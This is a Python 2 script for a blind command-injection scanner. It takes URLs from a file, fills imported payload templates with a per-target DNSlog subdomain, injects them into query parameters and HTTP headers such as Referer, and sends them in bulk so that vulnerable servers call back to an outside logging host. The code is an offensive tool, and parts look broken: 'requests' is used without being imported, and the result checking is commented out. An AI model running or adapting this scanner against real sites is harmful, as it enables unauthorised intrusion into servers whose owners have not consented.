#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import json
import logging
import grequests
from urlpollution import Pollution
from utils import Random, File, Url
from config import dnslog_host, bilid_request_timeout, headers, command_inject_log
from command_injection_payloads import payloads as payloads_tpl
from command_injection_payloads import headers as headers_tpl


class CommandInject:

    def __init__(self, filename):
        self.filename = filename
        # 加载url列表
        self.target_urls = self._load_file(self.filename)
        # 初始化日志
        self._loggingConfig()

    # 加载文件
    def _load_file(self, filename):
        with open(filename) as f:
            return [i.strip() for i in f]

    # 日志记录配置
    def _loggingConfig(self):
        logging.basicConfig(level=logging.DEBUG,
                            format='%(asctime)s %(levelname)s %(message)s',
                            filename=command_inject_log)

        logging.getLogger("requests").setLevel(logging.WARNING)

    def _get_dns_logs(self):
        query_dns_api = 'http://admin.dnslog.link/api/dns/e2f54f3a/e2f54f3a/'
        query_web_api = 'http://admin.dnslog.link/api/web/e2f54f3a/e2f54f3a/'
        try:
            r = requests.get(query_dns_api)
            j = r.json()
            ret = [i.get('host') for i in j.get('result', [])]
            return list(set(ret))
        except Exception as e:
            return list()

    def run(self):

        DNSLOG_HOST = 'e2f54f3a.dnslog.link'

        # run
        for url in self.target_urls:

            # 随机标记
            sign = Random.id_generator(size=10)

            # DNSLOG 地址
            dnslog_host = '{}.{}'.format(sign, DNSLOG_HOST)

            # 生成payload
            payloads = [payload.format(dnslog_host)
                        for payload in payloads_tpl]

            # Double Quotes
            d_quotes = [
                '"{}"'.format(payload) for payload in payloads
            ]
            payloads.extend(d_quotes)

            # 生成头部payload
            for k, v in headers_tpl.iteritems():
                if k == 'Referer':
                    headers[k] = v.format(url, dnslog_host)
                    continue
                headers[k] = v.format(dnslog_host)
            
            p = Pollution(payloads)

            urls = []

            for i in p.payload_generator(url):
                urls.append(i)
                print Url.urldecode(i)

            logging.info('{0} => {1}'.format(url, sign))

            print 'Payload Number:', len(urls)

            # Start
            rs = (grequests.get(u, headers=headers, allow_redirects=False)
                  for u in urls)

            grequests.map(rs, gtimeout=bilid_request_timeout)
            # # Load DNSLog Result
            # logs = self._load_log()

            # dns_logs = [i.replace('.e2f54f3a.dnslog.link.', '') for i in self._get_dns_logs()]
            # for i in dns_logs:
            #     for log in logs:
            #         if i in log:
            #             print log

if __name__ == '__main__':
    filename = 'output.txt'
    cmd = CommandInject(filename)
    cmd.run()
